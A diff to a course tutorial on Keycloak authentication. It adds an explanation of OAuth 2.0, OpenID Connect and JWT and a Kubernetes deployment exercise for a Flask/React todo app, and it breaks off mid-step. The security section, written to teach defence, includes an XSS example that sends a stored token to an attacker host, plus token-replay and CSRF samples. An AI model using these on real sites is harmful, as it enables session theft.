@@ -402,17 +402,20 @@ Automate client creation with scripts!
 - `CLIENT_TYPE`: `"public"` for frontend, `"confidential"` for backend
 - `FRONTEND_URLS`: List of all URLs where your frontend can be accessed
 
-**Important**: The `FRONTEND_URLS` list must include **all URLs** you'll use to access your frontend. OAuth requires exact matches for redirect URIs. Common URLs to include:
-- `http://localhost:3000` - Standard localhost
-- `http://127.0.0.1:3000` - IPv4 loopback
-- `http://YOUR-IP:3000` - Your machine's local network IP (find it with `hostname -I`)
+**Important**: The `FRONTEND_URLS` list must include **all URLs** you'll use to access your frontend. OAuth requires exact matches for redirect URIs.
 
 Example configuration in `create-client.py`:
 ```python
 FRONTEND_URLS = [
     "http://localhost:3000",
     "http://127.0.0.1:3000",
-    "http://10.0.0.200:3000",  # Change to your machine's IP
+]
+```
+
+For production deployments with a domain, add your production URL:
+```python
+FRONTEND_URLS = [
+    "https://myapp.ltu-m7011e-yourname.se",
 ]
 ```
 
@@ -847,27 +850,17 @@ kubectl logs -n keycloak -l app=keycloak
 
 **Problem**: Client not configured with correct redirect URI. This happens when the URL you're accessing your frontend from doesn't match the configured redirect URIs in Keycloak.
 
-**Common scenario**: You configured `http://localhost:3000/*` but accessed via `http://10.0.0.200:3000` or `http://127.0.0.1:3000`.
+**Common scenario**: You configured `http://localhost:3000/*` but accessed via `http://127.0.0.1:3000`.
 
-**Solution 1 - Add all URLs to configuration**:
-Edit `create-client.py` and add all URLs you'll use:
-```python
-FRONTEND_URLS = [
-    "http://localhost:3000",
-    "http://127.0.0.1:3000",
-    "http://10.0.0.200:3000",  # Your machine's IP
-]
-```
-Then run `python3 create-client.py` to update the client.
+**Solution 1 - Use localhost**:
+Always access your frontend at `http://localhost:3000`.
 
-**Solution 2 - Use only localhost**:
-Always access your frontend at `http://localhost:3000` (not via IP or 127.0.0.1).
-
-**Solution 3 - Manual configuration**:
+**Solution 2 - Manual configuration**:
 1. Go to Keycloak Admin Console → Clients → Your client
 2. Check "Valid Redirect URIs" includes the URL shown in the error
-3. Add `http://YOUR-IP:3000/*` if needed
-4. Save changes
+3. Add the missing URL (e.g., `http://127.0.0.1:3000/*`)
+4. Add to "Web Origins" as well (e.g., `http://127.0.0.1:3000`)
+5. Save changes
 
 ### CORS Errors
 
@@ -940,62 +933,608 @@ kubectl delete namespace keycloak
 
 ---
 
-## Understanding the Technology (Optional Deep Dive)
+## Understanding the Technology
 
-### OAuth 2.0 vs OpenID Connect vs JWT
+This section provides a comprehensive technical explanation of OAuth 2.0, OpenID Connect, JWT, and how Keycloak implements these standards.
 
-**OAuth 2.0** = Authorization framework ("what can you access?")
-- Delegates access to resources
-- Used by "Sign in with Google" buttons
+### The Foundation: OAuth 2.0
 
-**OpenID Connect (OIDC)** = Authentication layer on OAuth 2.0 ("who are you?")
-- Adds user identity verification
-- Provides ID tokens with user info
+**OAuth 2.0** is an **authorization framework** (RFC 6749) that enables applications to obtain limited access to user resources without exposing credentials. It answers the question: **"What can you access?"**
 
-**JWT** = Token format
-- Self-contained tokens with claims
-- Cryptographically signed
-- Used for both ID tokens and access tokens
+#### Key Concepts
 
-**Keycloak implements all three!**
+**Roles in OAuth 2.0:**
+- **Resource Owner** - The user who owns the data
+- **Client** - The application requesting access (your React/Flask app)
+- **Authorization Server** - Issues access tokens (Keycloak)
+- **Resource Server** - Hosts protected resources (your API)
 
-### Authentication Flow
+**Grant Types:**
+1. **Authorization Code** - Most secure, used for web apps (what we use)
+2. **Implicit** - Deprecated, previously for SPAs
+3. **Client Credentials** - For machine-to-machine communication
+4. **Resource Owner Password** - Direct username/password (discouraged)
+5. **Refresh Token** - Exchange refresh token for new access token
+
+#### OAuth 2.0 Authorization Code Flow
 
 ```
-1. User clicks "Login" in your app
-2. App redirects to Keycloak login page
-3. User enters credentials
-4. Keycloak verifies credentials
-5. Keycloak redirects back with authorization code
-6. App exchanges code for tokens (access, ID, refresh)
-7. App uses access token to call APIs
-8. APIs verify token signature with Keycloak's public keys
+┌─────────┐                                           ┌─────────────────┐
+│ Browser │                                           │   Keycloak      │
+│  (User) │                                           │ (Auth Server)   │
+└────┬────┘                                           └────────┬────────┘
+     │                                                          │
+     │ 1. Click "Login"                                         │
+     ├──────────────────────────────────────┐                  │
+     │                                       ▼                  │
+┌────┴────────┐                     ┌──────────────┐           │
+│   React     │                     │              │           │
+│  Frontend   │                     │              │           │
+└────┬────────┘                     └──────────────┘           │
+     │                                                          │
+     │ 2. Redirect to Authorization Endpoint                   │
+     │    GET /realms/myapp/protocol/openid-connect/auth       │
+     │    ?client_id=my-frontend-app                           │
+     │    &redirect_uri=http://localhost:3000                  │
+     │    &response_type=code                                  │
+     │    &scope=openid profile email                          │
+     ├─────────────────────────────────────────────────────────>│
+     │                                                          │
+     │                                      3. Show Login Page  │
+     │<─────────────────────────────────────────────────────────┤
+     │                                                          │
+     │ 4. User enters credentials                              │
+     ├─────────────────────────────────────────────────────────>│
+     │                                                          │
+     │                                      5. Verify credentials│
+     │                                         Create session   │
+     │                                                          │
+     │ 6. Redirect with Authorization Code                     │
+     │    http://localhost:3000/?code=ABC123&state=XYZ         │
+     │<─────────────────────────────────────────────────────────┤
+     │                                                          │
+     │ 7. Exchange code for tokens                             │
+     │    POST /realms/myapp/protocol/openid-connect/token     │
+     │    code=ABC123                                           │
+     │    client_id=my-frontend-app                            │
+     │    redirect_uri=http://localhost:3000                   │
+     │    grant_type=authorization_code                        │
+     ├─────────────────────────────────────────────────────────>│
+     │                                                          │
+     │                                      8. Validate code    │
+     │                                         Issue tokens     │
+     │                                                          │
+     │ 9. Return tokens                                        │
+     │    {                                                    │
+     │      "access_token": "eyJhbGc...",                      │
+     │      "id_token": "eyJhbGc...",                          │
+     │      "refresh_token": "eyJhbGc...",                     │
+     │      "token_type": "Bearer",                            │
+     │      "expires_in": 300                                  │
+     │    }                                                    │
+     │<─────────────────────────────────────────────────────────┤
+     │                                                          │
+     │ 10. Store tokens in memory                              │
+     │                                                          │
+     │                                                          │
+     │ 11. Call API with Access Token                          │
+     ├──────────────────────────────────────┐                  │
+     │                                       ▼                  │
+     │                              ┌──────────────┐            │
+     │                              │    Flask     │            │
+     │                              │   Backend    │            │
+     │  Authorization: Bearer token │     API      │            │
+     ├─────────────────────────────>│              │            │
+     │                              └──────┬───────┘            │
+     │                                     │                    │
+     │                                     │ 12. Verify token   │
+     │                                     │  (check signature) │
+     │                                     ├───────────────────>│
+     │                                     │  GET /realms/myapp/│
+     │                                     │  protocol/openid-  │
+     │                                     │  connect/certs     │
+     │                                     │                    │
+     │                                     │ 13. Public keys    │
+     │                                     │<───────────────────┤
+     │                                     │                    │
+     │                              14. Token valid             │
+     │                                  Extract claims          │
+     │                              ┌───────────────┐           │
+     │ 15. Return protected data    │               │           │
+     │<─────────────────────────────┤               │           │
+     │                              └───────────────┘           │
+     ▼                                                          │
 ```
 
-### JWT Token Structure
+**Why use authorization code instead of returning tokens directly?**
+- The code is single-use and expires quickly (typically 60 seconds)
+- The code is useless without the client credentials
+- Tokens never pass through the browser's front channel (address bar)
+- More secure against interception attacks
 
-A JWT has three parts: `header.payload.signature`
+### OpenID Connect (OIDC)
 
-**Header**: Algorithm used
-```json
-{"alg": "RS256", "typ": "JWT"}
+**OpenID Connect** is an **authentication layer** built on top of OAuth 2.0 (RFC 6749). It answers: **"Who are you?"**
+
+OAuth 2.0 alone doesn't provide authentication - it only provides authorization. OIDC adds:
+
+1. **ID Token** - A JWT containing user identity information
+2. **UserInfo Endpoint** - Standardized endpoint to get user profile
+3. **Standard Claims** - Predefined user attributes (sub, name, email, etc.)
+4. **Discovery** - Standardized metadata endpoint (/.well-known/openid-configuration)
+
+#### OIDC Scopes
+
+Scopes determine what information is included in tokens:
+
+- `openid` - **Required** - Indicates OIDC flow, returns `sub` (subject/user ID)
+- `profile` - Adds name, family_name, given_name, picture, etc.
+- `email` - Adds email and email_verified
+- `address` - Adds postal address
+- `phone` - Adds phone number
+
+#### OIDC vs OAuth 2.0
+
+| Aspect | OAuth 2.0 | OIDC |
+|--------|-----------|------|
+| Purpose | Authorization | Authentication + Authorization |
+| Primary Use | "Let app X access my photos" | "Prove who I am" |
+| Returns | Access Token | ID Token + Access Token |
+| User Info | No standard | UserInfo endpoint |
+| Client Types | Public, Confidential | Same + Hybrid |
+
+### JSON Web Tokens (JWT)
+
+**JWT** (RFC 7519) is a compact, URL-safe token format for transmitting claims between parties. A JWT consists of three Base64URL-encoded parts separated by dots:
+
+```
+eyJhbGc...  .  eyJzdWI...  .  SflKxwRJ...
+ │             │             │
+Header        Payload       Signature
 ```
 
-**Payload**: User info and claims
+#### JWT Structure Deep Dive
+
+**1. Header**
 ```json
 {
-  "sub": "user-id-123",
-  "name": "Test User",
-  "email": "test@example.com",
-  "realm_access": {"roles": ["editor"]},
-  "exp": 1735689600
+  "alg": "RS256",           // Algorithm: RSA with SHA-256
+  "typ": "JWT",             // Type: JSON Web Token
+  "kid": "abc123"           // Key ID: identifies which key signed this
 }
 ```
 
-**Signature**: Cryptographic signature
-- Ensures token hasn't been tampered with
-- Only Keycloak can create valid signatures
-- Anyone can verify using Keycloak's public keys
+**Common algorithms:**
+- `RS256` - RSA with SHA-256 (asymmetric, most common)
+- `HS256` - HMAC with SHA-256 (symmetric, shared secret)
+- `ES256` - ECDSA with SHA-256 (asymmetric, smaller keys)
+
+**2. Payload (Claims)**
+```json
+{
+  // Registered claims (RFC 7519)
+  "iss": "https://keycloak.ltu-m7011e-johan.se/realms/myapp",  // Issuer
+  "sub": "f4c8a9e6-1234-5678-90ab-cdef12345678",               // Subject (user ID)
+  "aud": "account",                                             // Audience
+  "exp": 1735689600,                                            // Expiration (Unix timestamp)
+  "nbf": 1735689300,                                            // Not Before
+  "iat": 1735689300,                                            // Issued At
+  "jti": "abc-123-def-456",                                     // JWT ID (unique)
+
+  // Public claims (OIDC standard)
+  "name": "Test User",
+  "given_name": "Test",
+  "family_name": "User",
+  "preferred_username": "testuser",
+  "email": "test@example.com",
+  "email_verified": true,
+
+  // Private claims (Keycloak-specific)
+  "realm_access": {
+    "roles": ["user", "admin"]
+  },
+  "resource_access": {
+    "my-frontend-app": {
+      "roles": ["view-profile"]
+    }
+  },
+  "scope": "openid profile email",
+  "session_state": "xyz-789",
+  "acr": "1",                    // Authentication Context Class Reference
+  "azp": "my-frontend-app",      // Authorized Party
+  "typ": "Bearer"
+}
+```
+
+**3. Signature**
+
+For RS256 (RSA asymmetric signing):
+
+```
+signature = RSA-SHA256(
+  base64urlEncode(header) + "." + base64urlEncode(payload),
+  privateKey
+)
+```
+
+**Key properties:**
+- **Stateless** - Token contains all necessary information
+- **Self-contained** - No database lookup needed to verify
+- **Tamper-proof** - Any modification invalidates the signature
+- **Not encrypted** - Anyone can decode and read (use HTTPS!)
+
+#### Token Verification Process
+
+When your Flask backend receives a JWT:
+
+```python
+def verify_token(token):
+    # 1. Decode header (no verification yet)
+    header = jwt.get_unverified_header(token)
+    kid = header['kid']  # Key ID
+
+    # 2. Fetch Keycloak's public keys
+    keys = requests.get(
+        "https://keycloak.../realms/myapp/protocol/openid-connect/certs"
+    ).json()
+
+    # 3. Find matching public key
+    public_key = find_key_by_kid(keys, kid)
+
+    # 4. Verify signature and validate claims
+    decoded = jwt.decode(
+        token,
+        public_key,
+        algorithms=['RS256'],
+        audience='account',
+        issuer='https://keycloak.../realms/myapp',
+        options={
+            'verify_signature': True,   # Cryptographic verification
+            'verify_exp': True,          # Check if expired
+            'verify_nbf': True,          # Check if valid yet
+            'verify_iss': True,          # Check issuer matches
+            'verify_aud': True           # Check audience matches
+        }
+    )
+
+    return decoded  # Token is valid!
+```
+
+**Why asymmetric signing (RS256)?**
+- Keycloak holds **private key** (signs tokens)
+- Your apps hold **public key** (verify tokens)
+- Apps can verify tokens without calling Keycloak
+- Public keys can be distributed safely
+- More secure than shared secrets (HS256)
+
+### Access Token vs ID Token vs Refresh Token
+
+Keycloak issues three types of tokens:
+
+#### 1. Access Token
+**Purpose:** Authorize API requests
+
+```json
+{
+  "typ": "Bearer",
+  "azp": "my-frontend-app",
+  "scope": "openid profile email",
+  "realm_access": {
+    "roles": ["user", "admin"]
+  }
+}
+```
+
+- Short-lived (5-15 minutes typical)
+- Contains authorization info (roles, scopes)
+- Sent in `Authorization: Bearer <token>` header
+- Used by Resource Server (API) to authorize requests
+
+#### 2. ID Token
+**Purpose:** Prove user identity
+
+```json
+{
+  "typ": "ID",
+  "sub": "user-id-123",
+  "name": "Test User",
+  "email": "test@example.com",
+  "email_verified": true
+}
+```
+
+- Contains user profile information
+- Conforms to OIDC specification
+- Used by Client (frontend) to display user info
+- Should NOT be sent to APIs (use access token instead)
+
+#### 3. Refresh Token
+**Purpose:** Obtain new access tokens without re-authentication
+
+```json
+{
+  "typ": "Refresh",
+  "scope": "openid profile email offline_access"
+}
+```
+
+- Long-lived (days/weeks)
+- Can be revoked by server
+- Single-use or rotation (new refresh token with each use)
+- Must be stored securely (not in localStorage!)
+- Used at `/token` endpoint with `grant_type=refresh_token`
+
+### Token Refresh Flow
+
+```
+┌─────────┐                                    ┌──────────────┐
+│ React   │                                    │  Keycloak    │
+│Frontend │                                    │              │
+└────┬────┘                                    └──────┬───────┘
+     │                                                │
+     │ 1. API call with expired access token         │
+     ├────────────┐                                   │
+     │            ▼                                   │
+     │      ┌──────────┐                             │
+     │      │  Flask   │                             │
+     │      │   API    │                             │
+     │      └─────┬────┘                             │
+     │            │                                   │
+     │ 2. 401 Unauthorized (token expired)           │
+     │<───────────┤                                   │
+     │                                                │
+     │ 3. POST /token with refresh token             │
+     │    grant_type=refresh_token                   │
+     │    refresh_token=eyJhbGc...                   │
+     ├───────────────────────────────────────────────>│
+     │                                                │
+     │                                4. Verify token │
+     │                                   Check not    │
+     │                                   revoked      │
+     │                                                │
+     │ 5. New tokens                                  │
+     │    {                                           │
+     │      "access_token": "eyJnew...",              │
+     │      "refresh_token": "eyJnew..." // rotation  │
+     │    }                                           │
+     │<───────────────────────────────────────────────┤
+     │                                                │
+     │ 6. Retry API call with new access token       │
+     ├────────────┐                                   │
+     │            ▼                                   │
+     │      ┌──────────┐                             │
+     │      │  Flask   │                             │
+     │      │   API    │                             │
+     │      └─────┬────┘                             │
+     │            │                                   │
+     │ 7. 200 OK with data                           │
+     │<───────────┤                                   │
+     ▼                                                │
+```
+
+### How Keycloak Implements These Standards
+
+Keycloak is a complete **Identity and Access Management (IAM)** solution that implements:
+
+1. **OAuth 2.0 Authorization Server**
+   - Issues access tokens
+   - Manages authorization codes
+   - Handles token refresh
+
+2. **OpenID Connect Provider**
+   - Issues ID tokens
+   - Provides UserInfo endpoint
+   - Implements discovery (/.well-known/openid-configuration)
+
+3. **JWT Token Issuer**
+   - Signs tokens with RSA keys
+   - Publishes public keys at `/certs` endpoint
+   - Supports token introspection
+
+4. **User Federation**
+   - LDAP/Active Directory integration
+   - Custom user storage providers
+   - Social login (Google, GitHub, etc.)
+
+5. **Additional Features**
+   - Multi-factor authentication (TOTP, WebAuthn)
+   - Single Sign-On (SSO) across applications
+   - User self-registration and account management
+   - Fine-grained authorization (policies, permissions)
+   - Event logging and auditing
+
+### Complete Authentication Flow with Keycloak
+
+Here's what happens when a user logs into the todo app:
+
+```
+┌─────────┐         ┌─────────┐         ┌──────────┐         ┌─────────┐
+│ Browser │         │  React  │         │ Keycloak │         │  Flask  │
+│         │         │ Frontend│         │          │         │   API   │
+└────┬────┘         └────┬────┘         └────┬─────┘         └────┬────┘
+     │                   │                    │                    │
+     │ 1. Visit app      │                    │                    │
+     ├──────────────────>│                    │                    │
+     │                   │                    │                    │
+     │                   │ 2. keycloak.init() │                    │
+     │                   │    onLoad: login-required              │
+     │                   ├───────────────────>│                    │
+     │                   │                    │                    │
+     │ 3. Redirect to /auth?response_type=code&client_id=...      │
+     │<──────────────────┴────────────────────┤                    │
+     │                                        │                    │
+     │ 4. GET /auth (show login page)         │                    │
+     ├───────────────────────────────────────>│                    │
+     │                                        │                    │
+     │ 5. Login form                          │                    │
+     │<───────────────────────────────────────┤                    │
+     │                                        │                    │
+     │ 6. POST credentials                    │                    │
+     ├───────────────────────────────────────>│                    │
+     │                                        │                    │
+     │                         7. Authenticate user                │
+     │                            Check password                   │
+     │                            Create session                   │
+     │                                        │                    │
+     │ 8. Redirect with code                  │                    │
+     │    http://localhost:3000/?code=ABC123  │                    │
+     │<───────────────────────────────────────┤                    │
+     │                                        │                    │
+     │ 9. Code in URL                         │                    │
+     ├──────────────────>│                    │                    │
+     │                   │                    │                    │
+     │                   │ 10. Exchange code for tokens            │
+     │                   │     POST /token    │                    │
+     │                   ├───────────────────>│                    │
+     │                   │                    │                    │
+     │                   │              11. Validate code          │
+     │                   │                  Issue tokens           │
+     │                   │                  - Access (JWT)         │
+     │                   │                  - ID (JWT)             │
+     │                   │                  - Refresh (JWT)        │
+     │                   │                    │                    │
+     │                   │ 12. Return tokens  │                    │
+     │                   │<───────────────────┤                    │
+     │                   │                    │                    │
+     │ 13. Store tokens in memory             │                    │
+     │    Parse ID token to get user info     │                    │
+     │                   │                    │                    │
+     │ 14. Show app UI   │                    │                    │
+     │<──────────────────┤                    │                    │
+     │                   │                    │                    │
+     │ 15. Click "Add Todo"                   │                    │
+     ├──────────────────>│                    │                    │
+     │                   │                    │                    │
+     │                   │ 16. POST /api/todos                     │
+     │                   │     Authorization: Bearer <access_token>│
+     │                   ├────────────────────────────────────────>│
+     │                   │                    │                    │
+     │                   │                    │  17. Extract token │
+     │                   │                    │      Get kid from  │
+     │                   │                    │      header        │
+     │                   │                    │                    │
+     │                   │                    │  18. Fetch public  │
+     │                   │                    │      keys          │
+     │                   │                    │<───────────────────┤
+     │                   │                    │                    │
+     │                   │                    │  19. Public keys   │
+     │                   │                    ├───────────────────>│
+     │                   │                    │                    │
+     │                   │                    │  20. Verify signature
+     │                   │                    │      Validate claims
+     │                   │                    │      Extract roles  │
+     │                   │                    │                    │
+     │                   │                    │  21. Authorized!   │
+     │                   │                    │      Create todo   │
+     │                   │                    │                    │
+     │                   │ 22. 201 Created    │                    │
+     │                   │<────────────────────────────────────────┤
+     │                   │                    │                    │
+     │ 23. Show new todo │                    │                    │
+     │<──────────────────┤                    │                    │
+     ▼                   ▼                    ▼                    ▼
+```
+
+### Security Considerations
+
+#### Why HTTPS is Critical
+
+JWTs are **signed** (tamper-proof) but **not encrypted** (anyone can decode):
+
+```bash
+# Anyone can decode a JWT!
+echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
+```
+
+**Without HTTPS:**
+- Tokens can be intercepted in transit
+- Attackers can steal tokens and impersonate users
+- Man-in-the-middle attacks are trivial
+
+**Always use HTTPS in production!**
+
+#### Token Storage Security
+
+| Location | Security | Notes |
+|----------|----------|-------|
+| **Memory** | ✅ Best | Lost on refresh, requires refresh token flow |
+| **SessionStorage** | ⚠️ OK | Cleared on tab close, vulnerable to XSS |
+| **LocalStorage** | ❌ Dangerous | Persists, highly vulnerable to XSS |
+| **Cookie (HttpOnly)** | ✅ Good | Not accessible to JavaScript, requires backend |
+
+**Our todo app uses memory** - most secure for SPAs.
+
+#### Common Attack Vectors
+
+**1. Cross-Site Scripting (XSS)**
+```javascript
+// Attacker injects malicious script
+<script>
+  const token = localStorage.getItem('access_token');
+  fetch('https://attacker.com/steal?token=' + token);
+</script>
+```
+
+**Mitigation:**
+- Store tokens in memory only
+- Use Content Security Policy (CSP)
+- Sanitize all user input
+- Use frameworks that escape by default (React does this)
+
+**2. Token Replay Attack**
+```bash
+# Attacker intercepts token and reuses it
+curl -H "Authorization: Bearer stolen_token" https://api.example.com/admin
+```
+
+**Mitigation:**
+- Short token lifetimes (5-15 minutes)
+- Token binding (bind to TLS session)
+- Audience validation (token only for specific API)
+
+**3. CSRF with Tokens**
+```html
+<!-- Attacker's page -->
+<img src="https://api.example.com/delete-account?token=..." />
+```
+
+**Mitigation:**
+- Use Authorization header (not cookies or query params)
+- Validate origin headers
+- Use CSRF tokens for state-changing operations
+
+### Debugging JWT Tokens
+
+**Decode token without verification:**
+```bash
+# Header
+echo "eyJhbGc..." | base64 -d | jq
+
+# Payload
+echo "eyJzdWI..." | base64 -d | jq
+```
+
+**Verify token signature:**
+```python
+import jwt
+import requests
+
+# Get Keycloak's public keys
+keys_url = "https://keycloak.../realms/myapp/protocol/openid-connect/certs"
+keys = requests.get(keys_url).json()
+
+# Find key and verify
+for key in keys['keys']:
+    if key['kid'] == token_kid:
+        public_key = jwt.algorithms.RSAAlgorithm.from_jwk(key)
+        decoded = jwt.decode(token, public_key, algorithms=['RS256'])
+```
+
+**Useful tools:**
+- **jwt.io** - Decode and verify tokens in browser
+- **openssl** - Verify signatures manually
+- **Keycloak Admin Console** - View/revoke tokens
+- **Browser DevTools** - Inspect network requests
 
 ---
 
@@ -1024,6 +1563,517 @@ Recommended settings (in Realm Settings → Tokens):
 
 ---
 
+## Exercise: Deploy Todo App on Kubernetes with Production TLS
+
+This exercise challenges you to deploy the complete todo application on LTU Rancher with production Let's Encrypt certificates.
+
+### Overview
+
+Deploy a full-stack authenticated application:
+- **Keycloak** - Already running (from earlier in this tutorial)
+- **Flask Backend API** - Containerized and deployed on K8s
+- **React Frontend** - Containerized and deployed on K8s with HTTPS
+
+### Prerequisites
+
+- Keycloak running on `https://keycloak.ltu-m7011e-yourname.se`
+- Realm `myapp` created
+- Understanding of Docker and Kubernetes from previous tutorials
+
+### Step 1: Prepare the Backend
+
+**1.1 Create Dockerfile for Flask API**
+
+Create `todo-app-example/backend/Dockerfile`:
+```dockerfile
+FROM python:3.11-slim
+
+WORKDIR /app
+
+# Install dependencies
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+
+# Copy application code
+COPY app.py .
+
+# Run as non-root user
+RUN useradd -m -u 1000 appuser && chown -R appuser:appuser /app
+USER appuser
+
+EXPOSE 5001
+
+CMD ["python", "app.py"]
+```
+
+**1.2 Create requirements.txt**
+
+Create `todo-app-example/backend/requirements.txt`:
+```
+Flask==3.0.0
+flask-cors==4.0.0
+PyJWT==2.8.0
+cryptography==41.0.7
+requests==2.31.0
+```
+
+**1.3 Update Configuration for Production**
+
+Edit `app.py` to use environment variables:
+```python
+import os
+
+# Keycloak configuration from environment
+KEYCLOAK_URL = os.getenv('KEYCLOAK_URL', 'https://keycloak.ltu-m7011e-yourname.se')
+REALM = os.getenv('KEYCLOAK_REALM', 'myapp')
+CLIENT_ID = os.getenv('KEYCLOAK_CLIENT_ID', 'my-frontend-app')
+INSECURE = os.getenv('INSECURE', 'False').lower() == 'true'
+
+# CORS - allow your frontend domain
+FRONTEND_URL = os.getenv('FRONTEND_URL', 'https://todo.ltu-m7011e-yourname.se')
+CORS(app, resources={
+    r"/api/*": {
+        "origins": [FRONTEND_URL],
+        "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
+        "allow_headers": ["Content-Type", "Authorization"]
+    }
+})
+```
+
+**1.4 Build and Push Docker Image**
+
+```bash
+cd todo-app-example/backend
+
+# Build image
+docker build -t todo-backend:latest .
+
+# Tag for your registry (if using private registry)
+docker tag todo-backend:latest registry.example.com/todo-backend:latest
+
+# Push to registry
+docker push registry.example.com/todo-backend:latest
+```
+
+### Step 2: Deploy Backend on Kubernetes
+
+**2.1 Create Backend Deployment**
+
+Create `todo-app-example/k8s/backend-deployment.yaml`:
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: todo-backend
+  namespace: yournamespace
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: todo-backend
+  template:
+    metadata:
+      labels:
+        app: todo-backend
+    spec:
+      containers:
+      - name: todo-backend
+        image: registry.example.com/todo-backend:latest
+        ports:
+        - containerPort: 5001
+        env:
+        - name: KEYCLOAK_URL
+          value: "https://keycloak.ltu-m7011e-yourname.se"
+        - name: KEYCLOAK_REALM
+          value: "myapp"
+        - name: KEYCLOAK_CLIENT_ID
+          value: "my-frontend-app"
+        - name: FRONTEND_URL
+          value: "https://todo.ltu-m7011e-yourname.se"
+        - name: INSECURE
+          value: "false"  # Production TLS
+        resources:
+          requests:
+            cpu: 100m
+            memory: 128Mi
+          limits:
+            cpu: 500m
+            memory: 512Mi
+        livenessProbe:
+          httpGet:
+            path: /
+            port: 5001
+          initialDelaySeconds: 10
+          periodSeconds: 30
+        readinessProbe:
+          httpGet:
+            path: /
+            port: 5001
+          initialDelaySeconds: 5
+          periodSeconds: 10
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: todo-backend
+  namespace: yournamespace
+spec:
+  selector:
+    app: todo-backend
+  ports:
+  - protocol: TCP
+    port: 5001
+    targetPort: 5001
+  type: ClusterIP
+---
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: todo-backend
+  namespace: yournamespace
+  annotations:
+    cert-manager.io/cluster-issuer: letsencrypt-prod
+    nginx.ingress.kubernetes.io/ssl-redirect: "true"
+spec:
+  ingressClassName: nginx
+  tls:
+  - hosts:
+    - todo-api.ltu-m7011e-yourname.se
+    secretName: todo-backend-tls
+  rules:
+  - host: todo-api.ltu-m7011e-yourname.se
+    http:
+      paths:
+      - path: /
+        pathType: Prefix
+        backend:
+          service:
+            name: todo-backend
+            port:
+              number: 5001
+```
+
+**2.2 Deploy Backend**
+
+```bash
+kubectl apply -f todo-app-example/k8s/backend-deployment.yaml
+
+# Verify deployment
+kubectl get pods -n yournamespace -l app=todo-backend
+kubectl get ingress -n yournamespace
+
+# Test backend
+curl https://todo-api.ltu-m7011e-yourname.se/
+```
+
+### Step 3: Prepare the Frontend
+
+**3.1 Create Dockerfile for React App**
+
+Create `todo-app-example/frontend/Dockerfile`:
+```dockerfile
+# Build stage
+FROM node:18-alpine AS build
+
+WORKDIR /app
+
+# Install dependencies
+COPY package*.json ./
+RUN npm ci
+
+# Copy source code
+COPY . .
+
+# Build production bundle
+RUN npm run build
+
+# Production stage
+FROM nginx:alpine
+
+# Copy built app to nginx
+COPY --from=build /app/build /usr/share/nginx/html
+
+# Copy nginx config
+COPY nginx.conf /etc/nginx/conf.d/default.conf
+
+EXPOSE 80
+
+CMD ["nginx", "-g", "daemon off;"]
+```
+
+**3.2 Create nginx Configuration**
+
+Create `todo-app-example/frontend/nginx.conf`:
+```nginx
+server {
+    listen 80;
+    server_name localhost;
+    root /usr/share/nginx/html;
+    index index.html;
+
+    # Enable gzip compression
+    gzip on;
+    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
+
+    # SPA routing - all routes go to index.html
+    location / {
+        try_files $uri $uri/ /index.html;
+    }
+
+    # Cache static assets
+    location /static/ {
+        expires 1y;
+        add_header Cache-Control "public, immutable";
+    }
+
+    # Security headers
+    add_header X-Frame-Options "SAMEORIGIN" always;
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header X-XSS-Protection "1; mode=block" always;
+}
+```
+
+**3.3 Update Frontend Configuration**
+
+Edit `src/keycloak-config.js`:
+```javascript
+export const keycloakConfig = {
+  url: 'https://keycloak.ltu-m7011e-yourname.se',
+  realm: 'myapp',
+  clientId: 'my-frontend-app'
+};
+```
+
+Edit `src/api.js`:
+```javascript
+// Use production API URL
+const API_BASE_URL = 'https://todo-api.ltu-m7011e-yourname.se/api';
+```
+
+**3.4 Build and Push Docker Image**
+
+```bash
+cd todo-app-example/frontend
+
+# Build image
+docker build -t todo-frontend:latest .
+
+# Tag and push
+docker tag todo-frontend:latest registry.example.com/todo-frontend:latest
+docker push registry.example.com/todo-frontend:latest
+```
+
+### Step 4: Deploy Frontend on Kubernetes
+
+**4.1 Create Frontend Deployment**
+
+Create `todo-app-example/k8s/frontend-deployment.yaml`:
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: todo-frontend
+  namespace: yournamespace
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: todo-frontend
+  template:
+    metadata:
+      labels:
+        app: todo-frontend
+    spec:
+      containers:
+      - name: todo-frontend
+        image: registry.example.com/todo-frontend:latest
+        ports:
+        - containerPort: 80
+        resources:
+          requests:
+            cpu: 50m
+            memory: 64Mi
+          limits:
+            cpu: 200m
+            memory: 256Mi
+        livenessProbe:
+          httpGet:
+            path: /
+            port: 80
+          initialDelaySeconds: 10
+          periodSeconds: 30
+        readinessProbe:
+          httpGet:
+            path: /
+            port: 80
+          initialDelaySeconds: 5
+          periodSeconds: 10
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: todo-frontend
+  namespace: yournamespace
+spec:
+  selector:
+    app: todo-frontend
+  ports:
+  - protocol: TCP
+    port: 80
+    targetPort: 80
+  type: ClusterIP
+---
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: todo-frontend
+  namespace: yournamespace
+  annotations:
+    cert-manager.io/cluster-issuer: letsencrypt-prod
+    nginx.ingress.kubernetes.io/ssl-redirect: "true"
+spec:
+  ingressClassName: nginx
+  tls:
+  - hosts:
+    - todo.ltu-m7011e-yourname.se
+    secretName: todo-frontend-tls
+  rules:
+  - host: todo.ltu-m7011e-yourname.se
+    http:
+      paths:
+      - path: /
+        pathType: Prefix
+        backend:
+          service:
+            name: todo-frontend
+            port:
+              number: 80
+```
+
+**4.2 Deploy Frontend**
+
+```bash
+kubectl apply -f todo-app-example/k8s/frontend-deployment.yaml
+
+# Verify deployment
+kubectl get pods -n yournamespace -l app=todo-frontend
+kubectl get ingress -n yournamespace
+
+# Check TLS certificate
+kubectl get certificate -n yournamespace
+```
+
+### Step 5: Update Keycloak Client
+
+**5.1 Update Redirect URIs**
+
+Update `create-client.py`:
+```python
+FRONTEND_URLS = [
+    "https://todo.ltu-m7011e-yourname.se",
+]
+```
+
+Run:
+```bash
+# Delete old client
